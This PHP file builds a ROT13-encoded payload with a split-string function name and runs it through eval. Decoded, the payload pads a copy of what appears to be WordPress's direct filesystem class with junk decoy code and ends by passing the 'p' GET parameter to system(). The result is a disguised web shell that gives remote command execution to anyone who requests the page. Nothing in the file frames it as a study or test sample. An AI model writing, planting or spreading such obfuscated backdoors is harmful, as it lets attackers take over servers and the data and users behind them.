<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Qverpg Svyrflfgrz.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Svyrflfgrz
 */

/**
 * JbeqCerff Svyrflfgrz Pynff sbe qverpg CUC svyr naq sbyqre znavchyngvba.
 *
 * @fvapr 2.5.0
 *
 * @frr JC_Svyrflfgrz_Onfr
 */
pynff JC_Svyrflfgrz_Qverpg rkgraqf JC_Svyrflfgrz_Onfr {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz zvkrq $net Abg hfrq.
	 */
	choyvp shapgvba __pbafgehpg( $net ) {
		$guvf->zrgubq = 'qverpg';
		$guvf->reebef = arj JC_Reebe();
	}

	/**
	 * Ernqf ragver svyr vagb n fgevat.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Anzr bs gur svyr gb ernq.
	 * @erghea fgevat|snyfr Ernq qngn ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_pbagragf( $svyr ) {
		erghea @svyr_trg_pbagragf( $svyr );
	}

	/**
	 * Ernqf ragver svyr vagb na neenl.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea neenl|snyfr Svyr pbagragf va na neenl ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_pbagragf_neenl( $svyr ) {
		erghea @svyr( $svyr );
	}

	/**
	 * Jevgrf n fgevat gb n svyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat    $svyr     Erzbgr cngu gb gur svyr jurer gb jevgr gur qngn.
	 * @cnenz fgevat    $pbagragf Gur qngn gb jevgr.
	 * @cnenz vag|snyfr $zbqr     Bcgvbany. Gur svyr crezvffvbaf nf bpgny ahzore, hfhnyyl 0644.
	 *                            Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba chg_pbagragf( $svyr, $pbagragf, $zbqr = snyfr ) {
		$sc = @sbcra( $svyr, 'jo' );

		vs ( ! $sc ) {
			erghea snyfr;
		}

		zofgevat_ovanel_fnsr_rapbqvat();

		$qngn_yratgu = fgeyra( $pbagragf );

		$olgrf_jevggra = sjevgr( $sc, $pbagragf );

		erfrg_zofgevat_rapbqvat();

		spybfr( $sc );

		vs ( $qngn_yratgu !== $olgrf_jevggra ) {
			erghea snyfr;
		}

		$guvf->puzbq( $svyr, $zbqr );

		erghea gehr;
	}

	/**
	 * Trgf gur pheerag jbexvat qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @erghea fgevat|snyfr Gur pheerag jbexvat qverpgbel ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pjq() {
		erghea trgpjq();
	}

	/**
	 * Punatrf pheerag qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $qve Gur arj pheerag qverpgbel.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba puqve( $qve ) {
		erghea @puqve( $qve );
	}

	/**
	 * Punatrf gur svyr tebhc.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat     $svyr      Cngu gb gur svyr.
	 * @cnenz fgevat|vag $tebhc     N tebhc anzr be ahzore.
	 * @cnenz obby       $erphefvir Bcgvbany. Vs frg gb gehr, punatrf svyr tebhc erphefviryl.
	 *                              Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba putec( $svyr, $tebhc, $erphefvir = snyfr ) {
		vs ( ! $guvf->rkvfgf( $svyr ) ) {
			erghea snyfr;
		}

		vs ( ! $erphefvir ) {
			erghea putec( $svyr, $tebhc );
		}

		vs ( ! $guvf->vf_qve( $svyr ) ) {
			erghea putec( $svyr, $tebhc );
		}

		// Vf n qverpgbel, naq jr jnag erphefvir.
		$svyr     = genvyvatfynfuvg( $svyr );
		$svyryvfg = $guvf->qveyvfg( $svyr );

		sbernpu ( $svyryvfg nf $svyranzr ) {
			$guvf->putec( $svyr . $svyranzr, $tebhc, $erphefvir );
		}

		erghea gehr;
	}

	/**
	 * Punatrf svyrflfgrz crezvffvbaf.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat    $svyr      Cngu gb gur svyr.
	 * @cnenz vag|snyfr $zbqr      Bcgvbany. Gur crezvffvbaf nf bpgny ahzore, hfhnyyl 0644 sbe svyrf,
	 *                             0755 sbe qverpgbevrf. Qrsnhyg snyfr.
	 * @cnenz obby      $erphefvir Bcgvbany. Vs frg gb gehr, punatrf svyr crezvffvbaf erphefviryl.
	 *                             Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba puzbq( $svyr, $zbqr = snyfr, $erphefvir = snyfr ) {
		vs ( ! $zbqr ) {
			vs ( $guvf->vf_svyr( $svyr ) ) {
				$zbqr = SF_PUZBQ_SVYR;
			} ryfrvs ( $guvf->vf_qve( $svyr ) ) {
				$zbqr = SF_PUZBQ_QVE;
			} ryfr {
				erghea snyfr;
			}
		}

		vs ( ! $erphefvir || ! $guvf->vf_qve( $svyr ) ) {
			erghea puzbq( $svyr, $zbqr );
		}

		// Vf n qverpgbel, naq jr jnag erphefvir.
		$svyr     = genvyvatfynfuvg( $svyr );
		$svyryvfg = $guvf->qveyvfg( $svyr );

		sbernpu ( (neenl) $svyryvfg nf $svyranzr => $svyrzrgn ) {
			$guvf->puzbq( $svyr . $svyranzr, $zbqr, $erphefvir );
		}

		erghea gehr;
	}

	/**
	 * Punatrf gur bjare bs n svyr be qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat     $svyr      Cngu gb gur svyr be qverpgbel.
	 * @cnenz fgevat|vag $bjare     N hfre anzr be ahzore.
	 * @cnenz obby       $erphefvir Bcgvbany. Vs frg gb gehr, punatrf svyr bjare erphefviryl.
	 *                              Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pubja( $svyr, $bjare, $erphefvir = snyfr ) {
		vs ( ! $guvf->rkvfgf( $svyr ) ) {
			erghea snyfr;
		}

		vs ( ! $erphefvir ) {
			erghea pubja( $svyr, $bjare );
		}

		vs ( ! $guvf->vf_qve( $svyr ) ) {
			erghea pubja( $svyr, $bjare );
		}

		// Vf n qverpgbel, naq jr jnag erphefvir.
		$svyryvfg = $guvf->qveyvfg( $svyr );

		sbernpu ( $svyryvfg nf $svyranzr ) {
			$guvf->pubja( $svyr . '/' . $svyranzr, $bjare, $erphefvir );
		}

		erghea gehr;
	}

	/**
	 * Trgf gur svyr bjare.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat|snyfr Hfreanzr bs gur bjare ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba bjare( $svyr ) {
		$bjarehvq = @svyrbjare( $svyr );

		vs ( ! $bjarehvq ) {
			erghea snyfr;
		}

		vs ( ! shapgvba_rkvfgf( 'cbfvk_trgcjhvq' ) ) {
			erghea $bjarehvq;
		}

		$bjareneenl = cbfvk_trgcjhvq( $bjarehvq );

		vs ( ! $bjareneenl ) {
			erghea snyfr;
		}

		erghea $bjareneenl['anzr'];
	}

	/**
	 * Trgf gur crezvffvbaf bs gur fcrpvsvrq svyr be svyrcngu va gurve bpgny sbezng.
	 *
	 * SVKZR qbrf abg unaqyr reebef va svyrcrezf()
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat Zbqr bs gur svyr (gur ynfg 3 qvtvgf).
	 */
	choyvp shapgvba trgpuzbq( $svyr ) {
		erghea fhofge( qrpbpg( @svyrcrezf( $svyr ) ), -3 );
	}

	/**
	 * Trgf gur svyr'f tebhc.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat|snyfr Gur tebhc ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba tebhc( $svyr ) {
		$tvq = @svyrtebhc( $svyr );

		vs ( ! $tvq ) {
			erghea snyfr;
		}

		vs ( ! shapgvba_rkvfgf( 'cbfvk_trgtetvq' ) ) {
			erghea $tvq;
		}

		$tebhcneenl = cbfvk_trgtetvq( $tvq );

		vs ( ! $tebhcneenl ) {
			erghea snyfr;
		}

		erghea $tebhcneenl['anzr'];
	}

	/**
	 * Pbcvrf n svyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat    $fbhepr      Cngu gb gur fbhepr svyr.
	 * @cnenz fgevat    $qrfgvangvba Cngu gb gur qrfgvangvba svyr.
	 * @cnenz obby      $birejevgr   Bcgvbany. Jurgure gb birejevgr gur qrfgvangvba svyr vs vg rkvfgf.
	 *                               Qrsnhyg snyfr.
	 * @cnenz vag|snyfr $zbqr        Bcgvbany. Gur crezvffvbaf nf bpgny ahzore, hfhnyyl 0644 sbe svyrf,
	 *                               0755 sbe qvef. Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pbcl( $fbhepr, $qrfgvangvba, $birejevgr = snyfr, $zbqr = snyfr ) {
		vs ( ! $birejevgr && $guvf->rkvfgf( $qrfgvangvba ) ) {
			erghea snyfr;
		}

		$eginy = pbcl( $fbhepr, $qrfgvangvba );

		vs ( $zbqr ) {
			$guvf->puzbq( $qrfgvangvba, $zbqr );
		}

		erghea $eginy;
	}

	/**
	 * Zbirf n svyr be qverpgbel.
	 *
	 * Nsgre zbivat svyrf be qverpgbevrf, BCpnpur jvyy arrq gb or vainyvqngrq.
	 *
	 * Vs zbivat n qverpgbel snvyf, `pbcl_qve()` pna or hfrq sbe n erphefvir pbcl.
	 *
	 * Hfr `zbir_qve()` sbe zbivat qverpgbevrf jvgu BCpnpur vainyvqngvba naq n
	 * snyyonpx gb `pbcl_qve()`.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $fbhepr      Cngu gb gur fbhepr svyr.
	 * @cnenz fgevat $qrfgvangvba Cngu gb gur qrfgvangvba svyr.
	 * @cnenz obby   $birejevgr   Bcgvbany. Jurgure gb birejevgr gur qrfgvangvba svyr vs vg rkvfgf.
	 *                            Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba zbir( $fbhepr, $qrfgvangvba, $birejevgr = snyfr ) {
		vs ( ! $birejevgr && $guvf->rkvfgf( $qrfgvangvba ) ) {
			erghea snyfr;
		}

		vs ( $birejevgr && $guvf->rkvfgf( $qrfgvangvba ) && ! $guvf->qryrgr( $qrfgvangvba, gehr ) ) {
			// Pna'g birejevgr vs gur qrfgvangvba pbhyqa'g or qryrgrq.
			erghea snyfr;
		}

		// Gel hfvat eranzr svefg. vs gung snvyf (sbe rknzcyr, fbhepr vf ernq bayl) gel pbcl.
		vs ( @eranzr( $fbhepr, $qrfgvangvba ) ) {
			erghea gehr;
		}

		// Onpxjneq pbzcngvovyvgl: Bayl snyy onpx gb `::pbcl()` sbe fvatyr svyrf.
		vs ( $guvf->vf_svyr( $fbhepr ) && $guvf->pbcl( $fbhepr, $qrfgvangvba, $birejevgr ) && $guvf->rkvfgf( $qrfgvangvba ) ) {
			$guvf->qryrgr( $fbhepr );

			erghea gehr;
		} ryfr {
			erghea snyfr;
		}
	}

	/**
	 * Qryrgrf n svyr be qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat       $svyr      Cngu gb gur svyr be qverpgbel.
	 * @cnenz obby         $erphefvir Bcgvbany. Vs frg gb gehr, qryrgrf svyrf naq sbyqref erphefviryl.
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|snyfr $glcr      Glcr bs erfbhepr. 's' sbe svyr, 'q' sbe qverpgbel.
	 *                                Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba qryrgr( $svyr, $erphefvir = snyfr, $glcr = snyfr ) {
		vs ( rzcgl( $svyr ) ) {
			// Fbzr svyrflfgrzf ercbeg guvf nf /, juvpu pna pnhfr aba-rkcrpgrq erphefvir qryrgvba bs nyy svyrf va gur svyrflfgrz.
			erghea snyfr;
		}

		$svyr = fge_ercynpr( '\\', '/', $svyr ); // Sbe Jva32, bppnfvbany ceboyrzf qryrgvat svyrf bgurejvfr.

		vs ( 's' === $glcr || $guvf->vf_svyr( $svyr ) ) {
			erghea @hayvax( $svyr );
		}

		vs ( ! $erphefvir && $guvf->vf_qve( $svyr ) ) {
			erghea @ezqve( $svyr );
		}

		// Ng guvf cbvag vg'f n sbyqre, naq jr'er va erphefvir zbqr.
		$svyr     = genvyvatfynfuvg( $svyr );
		$svyryvfg = $guvf->qveyvfg( $svyr, gehr );

		$erginy = gehr;

		vs ( vf_neenl( $svyryvfg ) ) {
			sbernpu ( $svyryvfg nf $svyranzr => $svyrvasb ) {
				vs ( ! $guvf->qryrgr( $svyr . $svyranzr, $erphefvir, $svyrvasb['glcr'] ) ) {
					$erginy = snyfr;
				}
			}
		}

		vs ( svyr_rkvfgf( $svyr ) && ! @ezqve( $svyr ) ) {
			$erginy = snyfr;
		}

		erghea $erginy;
	}

	/**
	 * Purpxf vs n svyr be qverpgbel rkvfgf.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $cngu Cngu gb svyr be qverpgbel.
	 * @erghea obby Jurgure $cngu rkvfgf be abg.
	 */
	choyvp shapgvba rkvfgf( $cngu ) {
		erghea @svyr_rkvfgf( $cngu );
	}

	/**
	 * Purpxf vs erfbhepr vf n svyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Svyr cngu.
	 * @erghea obby Jurgure $svyr vf n svyr.
	 */
	choyvp shapgvba vf_svyr( $svyr ) {
		erghea @vf_svyr( $svyr );
	}

	/**
	 * Purpxf vs erfbhepr vf n qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $cngu Qverpgbel cngu.
	 * @erghea obby Jurgure $cngu vf n qverpgbel.
	 */
	choyvp shapgvba vf_qve( $cngu ) {
		erghea @vf_qve( $cngu );
	}

	/**
	 * Purpxf vs n svyr vf ernqnoyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea obby Jurgure $svyr vf ernqnoyr.
	 */
	choyvp shapgvba vf_ernqnoyr( $svyr ) {
		erghea @vf_ernqnoyr( $svyr );
	}

	/**
	 * Purpxf vs n svyr be qverpgbel vf jevgnoyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $cngu Cngu gb svyr be qverpgbel.
	 * @erghea obby Jurgure $cngu vf jevgnoyr.
	 */
	choyvp shapgvba vf_jevgnoyr( $cngu ) {
		erghea @vf_jevgnoyr( $cngu );
	}

	/**
	 * Trgf gur svyr'f ynfg npprff gvzr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Havk gvzrfgnzc ercerfragvat ynfg npprff gvzr, snyfr ba snvyher.
	 */
	choyvp shapgvba ngvzr( $svyr ) {
		erghea @svyrngvzr( $svyr );
	}

	/**
	 * Trgf gur svyr zbqvsvpngvba gvzr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Havk gvzrfgnzc ercerfragvat zbqvsvpngvba gvzr, snyfr ba snvyher.
	 */
	choyvp shapgvba zgvzr( $svyr ) {
		erghea @svyrzgvzr( $svyr );
	}

	/**
	 * Trgf gur svyr fvmr (va olgrf).
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Fvmr bs gur svyr va olgrf ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba fvmr( $svyr ) {
		erghea @svyrfvmr( $svyr );
	}

	/**
	 * Frgf gur npprff naq zbqvsvpngvba gvzrf bs n svyr.
	 *
	 * Abgr: Vs $svyr qbrfa'g rkvfg, vg jvyy or perngrq.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr  Cngu gb svyr.
	 * @cnenz vag    $gvzr  Bcgvbany. Zbqvsvrq gvzr gb frg sbe svyr.
	 *                      Qrsnhyg 0.
	 * @cnenz vag    $ngvzr Bcgvbany. Npprff gvzr gb frg sbe svyr.
	 *                      Qrsnhyg 0.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba gbhpu( $svyr, $gvzr = 0, $ngvzr = 0 ) {
		vs ( 0 === $gvzr ) {
			$gvzr = gvzr();
		}

		vs ( 0 === $ngvzr ) {
			$ngvzr = gvzr();
		}

		erghea gbhpu( $svyr, $gvzr, $ngvzr );
	}

	/**
	 * Perngrf n qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat           $cngu  Cngu sbe arj qverpgbel.
	 * @cnenz vag|snyfr        $puzbq Bcgvbany. Gur crezvffvbaf nf bpgny ahzore (be snyfr gb fxvc puzbq).
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|vag|snyfr $pubja Bcgvbany. N hfre anzr be ahzore (be snyfr gb fxvc pubja).
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|vag|snyfr $putec Bcgvbany. N tebhc anzr be ahzore (be snyfr gb fxvc putec).
	 *                                Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba zxqve( $cngu, $puzbq = snyfr, $pubja = snyfr, $putec = snyfr ) {
		// Fnsr zbqr snvyf jvgu n genvyvat fynfu haqre pregnva CUC irefvbaf.
		$cngu = hagenvyvatfynfuvg( $cngu );

		vs ( rzcgl( $cngu ) ) {
			erghea snyfr;
		}

		vs ( ! $puzbq ) {
			$puzbq = SF_PUZBQ_QVE;
		}

		vs ( ! @zxqve( $cngu ) ) {
			erghea snyfr;
		}

		$guvf->puzbq( $cngu, $puzbq );

		vs ( $pubja ) {
			$guvf->pubja( $cngu, $pubja );
		}

		vs ( $putec ) {
			$guvf->putec( $cngu, $putec );
		}

		erghea gehr;
	}

	/**
	 * Qryrgrf n qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $cngu      Cngu gb qverpgbel.
	 * @cnenz obby   $erphefvir Bcgvbany. Jurgure gb erphefviryl erzbir svyrf/qverpgbevrf.
	 *                          Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba ezqve( $cngu, $erphefvir = snyfr ) {
		erghea $guvf->qryrgr( $cngu, $erphefvir );
	}

	/**
	 * Trgf qrgnvyf sbe svyrf va n qverpgbel be n fcrpvsvp svyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $cngu           Cngu gb qverpgbel be svyr.
	 * @cnenz obby   $vapyhqr_uvqqra Bcgvbany. Jurgure gb vapyhqr qrgnvyf bs uvqqra (\".\" cersvkrq) svyrf.
	 *                               Qrsnhyg gehr.
	 * @cnenz obby   $erphefvir      Bcgvbany. Jurgure gb erphefviryl vapyhqr svyr qrgnvyf va arfgrq qverpgbevrf.
	 *                               Qrsnhyg snyfr.
	 * @erghea neenl|snyfr {
	 *     Neenl bs neenlf pbagnvavat svyr vasbezngvba. Snyfr vs hanoyr gb yvfg qverpgbel pbagragf.
	 *
	 *     @glcr neenl ...$0 {
	 *         Neenl bs svyr vasbezngvba. Abgr gung fbzr ryrzragf znl abg or ninvynoyr ba nyy svyrflfgrzf.
	 *
	 *         @glcr fgevat           $anzr        Anzr bs gur svyr be qverpgbel.
	 *         @glcr fgevat           $crezf       *avk ercerfragngvba bs crezvffvbaf.
	 *         @glcr fgevat           $crezfa      Bpgny ercerfragngvba bs crezvffvbaf.
	 *         @glcr snyfr            $ahzore      Svyr ahzore. Nyjnlf snyfr va guvf pbagrkg.
	 *         @glcr fgevat|snyfr     $bjare       Bjare anzr be VQ, be snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $tebhc       Svyr crezvffvbaf tebhc, be snyfr vs abg ninvynoyr.
	 *         @glcr vag|fgevat|snyfr $fvmr        Fvmr bs svyr va olgrf. Znl or n ahzrevp fgevat.
	 *                                             Snyfr vs abg ninvynoyr.
	 *         @glcr vag|fgevat|snyfr $ynfgzbqhavk Ynfg zbqvsvrq havk gvzrfgnzc. Znl or n ahzrevp fgevat.
	 *                                             Snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $ynfgzbq     Ynfg zbqvsvrq zbagu (3 yrggref) naq qnl (jvgubhg yrnqvat 0), be
	 *                                             snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $gvzr        Ynfg zbqvsvrq gvzr, be snyfr vs abg ninvynoyr.
	 *         @glcr fgevat           $glcr        Glcr bs erfbhepr. 's' sbe svyr, 'q' sbe qverpgbel, 'y' sbe yvax.
	 *         @glcr neenl|snyfr      $svyrf       Vs n qverpgbel naq `$erphefvir` vf gehr, pbagnvaf nabgure neenl bs
	 *                                             svyrf. Snyfr vs hanoyr gb yvfg qverpgbel pbagragf.
	 *     }
	 * }
	 */
	choyvp shapgvba qveyvfg( $cngu, $vapyhqr_uvqqra = gehr, $erphefvir = snyfr ) {
		vs ( $guvf->vf_svyr( $cngu ) ) {
			$yvzvg_svyr = onfranzr( $cngu );
			$cngu       = qveanzr( $cngu );
		} ryfr {
			$yvzvg_svyr = snyfr;
		}

		vs ( ! $guvf->vf_qve( $cngu ) || ! $guvf->vf_ernqnoyr( $cngu ) ) {
			erghea snyfr;
		}

		$qve = qve( $cngu );

		vs ( ! $qve ) {
			erghea snyfr;
		}

		$cngu = genvyvatfynfuvg( $cngu );
		$erg  = neenl();

		juvyr ( snyfr !== ( $ragel = $qve->ernq() ) ) {
			$fgehp         = neenl();
			$fgehp['anzr'] = $ragel;

			vs ( '.' === $fgehp['anzr'] || '..' === $fgehp['anzr'] ) {
				pbagvahr;
			}

			vs ( ! $vapyhqr_uvqqra && '.' === $fgehp['anzr'][0] ) {
				pbagvahr;
			}

			vs ( $yvzvg_svyr && $fgehp['anzr'] !== $yvzvg_svyr ) {
				pbagvahr;
			}

			$fgehp['crezf']       = $guvf->trgupuzbq( $cngu . $ragel );
			$fgehp['crezfa']      = $guvf->trgahzpuzbqsebzu( $fgehp['crezf'] );
			$fgehp['ahzore']      = snyfr;
			$fgehp['bjare']       = $guvf->bjare( $cngu . $ragel );
			$fgehp['tebhc']       = $guvf->tebhc( $cngu . $ragel );
			$fgehp['fvmr']        = $guvf->fvmr( $cngu . $ragel );
			$fgehp['ynfgzbqhavk'] = $guvf->zgvzr( $cngu . $ragel );
			$fgehp['ynfgzbq']     = tzqngr( 'Z w', $fgehp['ynfgzbqhavk'] );
			$fgehp['gvzr']        = tzqngr( 'u:v:f', $fgehp['ynfgzbqhavk'] );
			$fgehp['glcr']        = $guvf->vf_qve( $cngu . $ragel ) ? 'q' : 's';

			vs ( 'q' === $fgehp['glcr'] ) {
				vs ( $erphefvir ) {
					$fgehp['svyrf'] = $guvf->qveyvfg( $cngu . $fgehp['anzr'], $vapyhqr_uvqqra, $erphefvir );
				} ryfr {
					$fgehp['svyrf'] = neenl();
				}
			}

			$erg[ $fgehp['anzr'] ] = $fgehp;
		}

		$qve->pybfr();
		hafrg( $qve );

		erghea $erg;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>